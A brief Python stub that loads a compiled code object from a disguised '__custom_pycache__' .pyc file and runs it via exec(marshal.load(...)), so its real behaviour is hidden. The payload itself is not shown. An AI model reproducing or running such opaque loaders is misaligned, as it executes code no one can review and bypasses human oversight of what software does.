
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'http_exception_15664b3688584a4bbede15dd33fc5b1e.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
